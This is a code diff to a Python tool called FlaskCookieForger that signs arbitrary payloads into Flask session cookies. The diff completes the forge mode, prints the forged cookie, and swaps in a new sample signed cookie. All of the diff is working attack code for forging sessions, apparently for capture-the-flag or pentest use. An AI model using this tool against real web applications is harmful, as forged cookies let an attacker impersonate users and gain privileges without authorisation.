@@ -18,17 +18,21 @@ class FlaskCookieForger:
                                                    signer_kwargs={'key_derivation': key_derivation,
                                                                   'digest_method': digest_method})
         if mode == 0:
-            pass
+            self.forge()
         if mode == 1:
             self.verify()
         if mode == 2:
             self.read()
 
     def forge(self) -> str or None:
-        if self.__payload is not None:
-            print(colored('[+]', 'green') + ' forging session for given payload')
-            return self.__signer.dumps(self.__payload)
-        print(colored('[-]', 'red') + ' you must give me payload')
+        print(colored('[+]', 'green') + ' Mode = forging cookie')
+        if self.__payload is None:
+            print(colored('[-]', 'red') + ' For forge cookie you must specify payload')
+            exit(-1)
+        forged_session = self.__signer.dumps(self.__payload)
+        print(colored('[+]', 'green') + ' session successful forged')
+        print('You cookie = ' + colored(forged_session, 'yellow'))
+        return forged_session
 
 
     def verify(self) -> bool:
@@ -69,4 +73,5 @@ class FlaskCookieForger:
         return session_payload
 
 if __name__ == "__main__":
-    forger = FlaskCookieForger(mode=1,payload='eyJyb2xlIjoiaW5mbyJ9.XJ3M3w.lE5vK4fi4o3oZtOO3RKrvFIYh2w')
+    forger = FlaskCookieForger(mode=1,payload='IntcInJqYWthXCI6IFwicHJpdmV0b3NcIn0i.XNBqkA.drAJK7_DBn0q2GZnFsVl7UYv-Cg')
+
